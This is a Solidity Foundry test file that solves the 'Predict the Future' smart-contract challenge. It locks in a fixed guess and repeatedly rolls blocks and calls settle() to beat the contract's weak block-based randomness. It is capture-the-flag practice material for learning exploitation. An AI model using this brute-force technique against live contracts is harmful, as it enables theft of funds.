// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "src/PredictTheFuture.sol";
import "forge-std/Test.sol";

contract PredictTheFutureChallengeTest is Test {
    PredictTheFutureChallenge private predthefuturechallenge;
    address private constant ALICE = address(0x1);
    
    function setUp() external {
        vm.startPrank(ALICE);
        vm.deal(ALICE, 50 ether);
        predthefuturechallenge = (new PredictTheFutureChallenge){value: 1e18}();
    }

    function testHack() external {
        uint8 number = 0;

        for(uint i = 0; i < 10; i++) {
             // Since our guess should be between 0-9. We will pick up the constant number and will use it to spam the target contract
            (bool success,) = address(predthefuturechallenge).call{value: 1e18}(abi.encodeWithSignature("lockInGuess(uint8)", number));
            require(success, "tx failed");

            vm.roll(block.number+3); // block.number + 3
            (bool success1,) = address(predthefuturechallenge).call(abi.encodeWithSignature("settle()"));
            require(success1, "tx1 failed");

            if(predthefuturechallenge.isComplete()){
                return;
            }
        }
       
        assertEq(address(predthefuturechallenge).balance, 0);
    }
}